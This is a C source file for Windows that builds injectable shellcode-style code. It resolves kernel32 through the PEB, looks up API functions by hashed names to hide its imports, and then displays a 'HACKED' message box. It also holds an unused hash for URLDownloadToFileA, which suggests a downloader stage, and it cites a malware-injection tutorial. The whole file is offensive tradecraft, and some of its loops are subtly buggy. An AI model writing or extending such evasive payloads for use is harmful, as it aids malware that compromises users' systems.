#include <windows.h>

#include <synchapi.h>
#include <winternl.h>

#include <stdint.h>

#define ALWAYS_INLINE inline __attribute__((always_inline))

__attribute__((section("mysec"))) static ALWAYS_INLINE DWORD
hashOf(const char *data) {
  // https://cocomelonc.github.io/tutorial/2022/04/02/malware-injection-18.html
  DWORD hash = 0x35;
  for (int i = 0; i < data[i] != '\0'; i++) {
    hash += data[i] + (hash << 1);
  }
  return hash;
}

__attribute__((section("mysec"))) static ALWAYS_INLINE LPVOID
FindFuncInModule(HMODULE h, DWORD myHash) {
  // https://cocomelonc.github.io/tutorial/2022/04/02/malware-injection-18.html
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  PIMAGE_NT_HEADERS img_nt_header =
      (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY img_edt =
      (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)h +
                                img_nt_header->OptionalHeader
                                    .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                                    .VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
  PWORD fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);
  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
    if (hashOf(pFuncName) == myHash) {
      LPVOID result = (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
      return result;
    }
  }
  return 0;
}

__attribute__((section("mysec"))) static ALWAYS_INLINE HMODULE FindKernel32() {
  PPEB pebPtr = NtCurrentTeb()->ProcessEnvironmentBlock;
  PPEB_LDR_DATA ldr = pebPtr->Ldr;
  PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
  PLIST_ENTRY kernel_exe = head->Flink;
  PLIST_ENTRY ntdll_dll = kernel_exe->Flink;
  PLIST_ENTRY kernel32_dll = ntdll_dll->Flink;
  return CONTAINING_RECORD(kernel32_dll, LDR_DATA_TABLE_ENTRY,
                           InMemoryOrderLinks)
      ->DllBase;
}

__attribute__((noinline, flatten, section("mysec"))) void
test_func(void *dll_name_obj) {
  char *dll_name = (char *)dll_name_obj;
  const DWORD hash_GetProcAddress = 0x000000001ac1e8e1;
  const DWORD hash_LoadLibraryA = 0x00000000030aa4dd;
  const DWORD hash_ExitProcess = 0x0000000001015de0;
  const DWORD hash_URLDownloadToFileA = 0x000000008cfb1100;
  const DWORD hash_FreeConsole = 0xff6a46;
  HMODULE hkernel32 = FindKernel32();
  if (!hkernel32) {
    return;
  }
#define DECLARE(f) __typeof__(f) *my##f = NULL
  DECLARE(GetProcAddress);
  myGetProcAddress = FindFuncInModule(hkernel32, hash_GetProcAddress);
  if (!myGetProcAddress) {
    return;
  }
  DECLARE(LoadLibraryA);
  myLoadLibraryA = FindFuncInModule(hkernel32, hash_LoadLibraryA);
  if (!myLoadLibraryA) {
    return;
  }
#include "strings.inc"
  // myLoadLibraryA(dll_name);
  HMODULE huser32 = myLoadLibraryA(str_user32_dll);
  if (!huser32) {
    return;
  }
  DECLARE(MessageBoxA);
  myMessageBoxA = myGetProcAddress(huser32, str_MessageBoxA);
  if (!myMessageBoxA) {
    return;
  }
  myMessageBoxA(NULL, str_HACKED_, str_TEST, MB_OK);
  DECLARE(Sleep);
  mySleep = myGetProcAddress(hkernel32, str_Sleep);
  if (!mySleep) {
    return;
  }
  mySleep(5000);
}
